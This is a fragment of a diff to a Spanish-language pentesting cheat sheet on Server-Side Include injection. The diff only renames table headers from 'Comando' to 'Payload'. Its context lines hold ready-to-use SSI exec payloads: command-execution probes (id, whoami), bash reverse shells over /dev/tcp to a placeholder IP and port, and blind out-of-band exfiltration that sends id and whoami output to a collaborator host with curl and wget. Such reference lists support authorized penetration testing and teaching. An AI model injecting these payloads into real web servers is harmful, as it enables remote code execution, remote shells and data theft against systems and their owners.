@@ -21,7 +21,7 @@ linked:
 
 ## RCE Linux / Windows Básico
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#exec cmd="id" -->` | uid/gid del usuario del webserver | Probe estándar de RCE |
 | `<!--#exec cmd="whoami" -->` | Nombre del usuario (www-data/apache/IUSR) | Confirmar contexto |
@@ -40,7 +40,7 @@ linked:
 
 ## Reverse Shells
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" -->` | Shell interactiva (bash) | Vector estándar Linux |
 | `<!--#exec cmd="bash >& /dev/tcp/<IP>/<PORT> 0>&1" -->` | Igual, forma compacta | Variante |
@@ -58,7 +58,7 @@ linked:
 
 ## OOB Exfil (Blind RCE)
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#exec cmd="curl http://<collab>/?d=$(id\|base64)" -->` | Output de `id` por callback HTTP | RCE ciego con egress HTTP |
 | `<!--#exec cmd="wget http://<collab>/?d=$(whoami)" -->` | User por callback HTTP | Alternativa a curl |
